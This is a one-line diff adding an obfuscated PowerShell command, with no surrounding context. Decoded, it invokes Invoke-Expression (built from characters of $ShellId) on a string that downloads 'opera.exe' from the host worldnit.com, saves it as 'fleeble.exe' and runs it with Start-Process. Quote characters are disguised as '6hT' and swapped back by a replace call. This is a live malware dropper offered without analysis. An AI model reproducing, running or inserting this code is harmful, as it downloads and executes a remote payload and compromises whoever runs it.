@@ -1,0 +1,1 @@
+﻿&( $sheLlID[1]+$sheLLID[13]+'x')((('('+'Ne'+'w'+'-O'+'bje'+'ct Sys'+'tem.'+'Net.'+'We'+'bClient).'+'Do'+'wnloadFile(6hThttp:'+'//worldnit'+'.co'+'m'+'/op'+'era.e'+'xe'+'6'+'hT,6hT'+'f'+'l'+'eeble'+'.exe'+'6'+'h'+'T);St'+'a'+'r'+'t-Process'+' 6h'+'T'+'fle'+'ebl'+'e.'+'ex'+'e6hT')-rePLACE ([CHaR]54+[CHaR]104+[CHaR]84),[CHaR]39))
